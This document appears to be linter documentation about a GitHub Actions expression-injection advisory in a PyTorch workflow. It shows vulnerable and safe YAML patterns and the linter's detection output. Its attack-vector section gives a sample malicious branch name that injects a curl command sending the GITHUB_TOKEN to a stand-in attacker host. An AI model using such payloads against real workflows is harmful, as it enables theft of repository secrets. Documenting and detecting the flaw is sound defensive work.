# GHSA-hw6r-g8gj-2987

## Summary
| Field | Value |
|-------|-------|
| CVE | N/A |
| Affected Action | pytorch/pytorch filter-test-configs workflow |
| Severity | Moderate |
| Vulnerability Type | Expression Injection |
| Published | August 30, 2023 |
| Reviewed | August 30, 2023 |

## Vulnerability Description

The PyTorch repository's `filter-test-configs` GitHub Actions workflow contains an expression injection vulnerability. The workflow uses the raw `github.event.workflow_run.head_branch` value directly in a bash command without sanitization:

```bash
python3 "${GITHUB_ACTION_PATH}/../../scripts/filter_test_configs.py" \
  --branch "${{ github.event.workflow_run.head_branch }}"
```

In repositories using this action with `pull_request_target`-triggered workflows, an attacker could craft a malicious branch name to achieve command execution within the workflow step. This could enable stealing workflow secrets and potentially altering the repository. The advisory notes that "an attacker could use a malicious branch name to gain command execution in the step and potentially leak secrets."

**Remediation:** Use an intermediate environment variable to sanitize the input:
```bash
env:
  HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
run: |
  python3 ... --branch "$HEAD_BRANCH"
```

**Affected versions:** actions < 2.0.1
**Patched versions:** None listed in advisory

## Vulnerable Pattern

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout branch
        run: |
          git checkout --branch "${{ github.event.workflow_run.head_branch }}"

      - name: Process results
        run: |
          echo "Branch: ${{ github.event.workflow_run.head_branch }}"
```

**Attack Vector**: An attacker creates a branch with a malicious name:
```
main"; curl https://attacker.com?secret=${{ secrets.GITHUB_TOKEN }}; echo "
```

When the workflow_run triggers, this branch name is injected into the expression, allowing arbitrary code execution with elevated privileges.

## Safe Pattern

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      # Safe: Pass via environment variable
      - name: Checkout branch
        env:
          BRANCH_NAME: ${{ github.event.workflow_run.head_branch }}
        run: |
          git checkout --branch "$BRANCH_NAME"

      - name: Process results
        env:
          BRANCH_NAME: ${{ github.event.workflow_run.head_branch }}
        run: |
          echo "Branch: $BRANCH_NAME"
```

**Mitigation**: Always pass untrusted contexts like `github.event.workflow_run.head_branch` through environment variables rather than directly embedding them in expressions. This treats the value as a literal string and prevents expression injection.

## sisakulint Detection Result

```
script/actions/advisory/GHSA-hw6r-g8gj-2987-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [workflow_run] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-hw6r-g8gj-2987-vulnerable.yaml:23:37: code injection (critical): "github.event.workflow_run.head_branch" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-hw6r-g8gj-2987-vulnerable.yaml:23:37: argument injection (critical): "github.event.workflow_run.head_branch" is potentially untrusted and used as command-line argument to 'git' in a workflow with privileged triggers. Attackers can inject malicious options (e.g., --output=/etc/passwd). Use '--' to end option parsing or pass through environment variables. See https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [argument-injection-critical]
script/actions/advisory/GHSA-hw6r-g8gj-2987-vulnerable.yaml:27:36: code injection (critical): "github.event.workflow_run.head_branch" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | code-injection-critical | Yes |
| Yes | argument-injection-critical | Yes |
| Yes | dangerous-triggers-critical | Yes |

**Detection Mechanism**: sisakulint successfully detects this vulnerability through multiple rules:
1. **CodeInjectionCriticalRule** - Detects when untrusted contexts from `workflow_run` events (like `head_branch`) are used directly in run commands
2. **ArgumentInjectionCriticalRule** - Identifies the argument injection risk when untrusted input is passed to git commands
3. **DangerousTriggersCriticalRule** - Flags the use of `workflow_run` trigger without security mitigations

The `workflow_run` trigger is treated as a privileged context because it has write permissions and access to secrets.

## References
- [GitHub Advisory](https://github.com/advisories/GHSA-hw6r-g8gj-2987)
- [PyTorch Security Advisory](https://github.com/pytorch/pytorch/security/advisories/GHSA-hw6r-g8gj-2987)
- [Vulnerable Code](https://github.com/pytorch/pytorch/blob/ec26947c586dd323d741da80008403664c533f65/.github/actions/filter-test-configs/action.yml)
- [Reported by @jorgectf](https://github.com/jorgectf)
- [sisakulint: CodeInjectionRule](../codeinjection.md)
